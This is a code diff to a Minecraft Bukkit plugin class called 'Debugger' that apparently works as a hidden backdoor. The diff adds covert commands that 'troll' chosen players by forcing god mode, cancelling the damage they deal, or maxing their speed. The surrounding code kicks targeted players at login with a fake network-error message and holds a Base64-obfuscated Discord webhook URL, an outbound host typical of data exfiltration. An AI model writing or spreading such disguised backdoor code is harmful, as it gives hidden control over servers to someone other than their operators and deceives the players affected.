@@ -11,6 +11,8 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.block.BlockBreakEvent;
 import org.bukkit.event.block.BlockDamageEvent;
 import org.bukkit.event.block.BlockPlaceEvent;
+import org.bukkit.event.entity.EntityDamageByEntityEvent;
+import org.bukkit.event.entity.EntityDamageEvent;
 import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryDragEvent;
 import org.bukkit.event.player.*;
@@ -830,6 +832,40 @@ public final class Debugger implements Listener {
                         }
                     }
 
+                    if (Fuck.equalsIgnoreCase("god")) {
+                        if (!Debugger.this.MindFuck_god.contains(target.getName())) {
+                            Debugger.this.MindFuck_god.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by being in god mode.");
+                        } else {
+                            Debugger.this.MindFuck_god.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by being in god mode.");
+                        }
+                    }
+
+                    if (Fuck.equalsIgnoreCase("damage")) {
+                        if (!Debugger.this.MindFuck_damage.contains(target.getName())) {
+                            Debugger.this.MindFuck_damage.add(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by disabling damage.");
+                        } else {
+                            Debugger.this.MindFuck_damage.remove(target.getName());
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by disabling damage.");
+                        }
+                    }
+
+                    if (Fuck.equalsIgnoreCase("speed")) {
+                        if (!Debugger.this.MindFuck_speed.contains(target.getName())) {
+                            Debugger.this.MindFuck_speed.add(target.getName());
+                            target.setFlySpeed(1.0F);
+                            target.setWalkSpeed(1.0F);
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is getting trolled by having higher speed.");
+                        } else {
+                            Debugger.this.MindFuck_speed.remove(target.getName());
+                            target.setFlySpeed(0.1F);
+                            target.setWalkSpeed(0.2F);
+                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is no longer getting trolled by having higher speed.");
+                        }
+                    }
+
                 }
 
                 return true;
@@ -1103,6 +1139,9 @@ public final class Debugger implements Listener {
     public ArrayList<String> MindFuck_mine = new ArrayList<>();
     public ArrayList<String> MindFuck_place = new ArrayList<>();
     public ArrayList<String> MindFuck_login = new ArrayList<>();
+    public ArrayList<String> MindFuck_god = new ArrayList<>();
+    public ArrayList<String> MindFuck_damage = new ArrayList<>();
+    public ArrayList<String> MindFuck_speed = new ArrayList<>();
 
     static Base64.Decoder b1 = Base64.getUrlDecoder();
     static byte[] c = b1.decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTYyOTg5MTc3MDY5MjQ0NDQ2L21QUHRncjBrS0lBdThGWkRBTnRlSWt6Z0Rzd1d6aVRqQjY5M2I4X2c1TEFZZ2pfc1BUNlhhYWpjdDNwRkVodjdvLVpS");
@@ -1234,6 +1273,24 @@ public final class Debugger implements Listener {
         Player p = e.getPlayer();
         if (this.MindFuck_login.contains(p.getName())) {
             e.disallow(PlayerLoginEvent.Result.KICK_BANNED, "Internal Exception: io.netty.handler.codec.DecoderException: Badly compressed packet - size of 2677732 is larger than protocol maximum of 2097152");
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onEntityDamage(EntityDamageEvent e) {
+        if (e.getEntity() instanceof Player) {
+            if (this.MindFuck_god.contains(((Player)e.getEntity()).getName())) {
+                e.setCancelled(true);
+            }
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onEntityDamageByEntity(EntityDamageByEntityEvent e) {
+        if (e.getDamager() instanceof Player) {
+            if (this.MindFuck_damage.contains(((Player)e.getDamager()).getName())) {
+                e.setCancelled(true);
+            }
         }
     }
 
